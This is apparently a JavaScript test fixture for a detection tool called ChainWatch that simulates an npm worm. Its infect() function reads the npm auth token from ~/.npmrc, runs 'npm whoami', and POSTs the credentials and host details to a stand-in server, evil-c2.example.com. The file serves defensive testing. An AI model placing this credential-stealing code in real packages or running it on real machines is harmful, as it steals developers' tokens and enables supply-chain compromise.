'use strict';

/**
 * fake-worm — SIMULATED Shai-Hulud-style npm worm (for ChainWatch testing).
 *
 * This is NOT real malware. It mimics the three-step attack chain that the 2026
 * Shai-Hulud / ChainDrop worms used:
 *
 *   1. Read ~/.npmrc to steal the npm auth token (credential_access)
 *   2. Run `npm whoami` to verify/enumerate the token (self_propagation)
 *   3. POST the stolen token to an external C2 host (network_exfil)
 *
 * ChainWatch should catch and block this chain in real time.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');
const { execSync } = require('child_process');

function infect() {
  // Step 1: Steal npm credentials from ~/.npmrc
  const npmrcPath = path.join(os.homedir(), '.npmrc');
  let creds = '';
  try {
    creds = fs.readFileSync(npmrcPath, 'utf8');
  } catch {
    creds = '(no .npmrc found)';
  }

  // Step 2: Verify the stolen token by checking npm identity
  let whoami = '';
  try {
    whoami = execSync('npm whoami', { encoding: 'utf8', timeout: 5000 }).trim();
  } catch {
    whoami = '(npm whoami failed)';
  }

  // Step 3: Exfiltrate credentials to attacker C2 server
  const payload = JSON.stringify({
    type: 'npm_token_theft',
    credentials: creds,
    identity: whoami,
    host: os.hostname(),
    platform: process.platform,
  });

  return new Promise((resolve) => {
    const req = http.request(
      {
        hostname: 'evil-c2.example.com',
        port: 80,
        path: '/collect',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      },
      (res) => resolve({ status: res.statusCode, exfiltrated: true }),
    );
    req.on('error', () => resolve({ status: 'error', exfiltrated: false }));
    req.write(payload);
    req.end();
  });
}

module.exports = { infect };
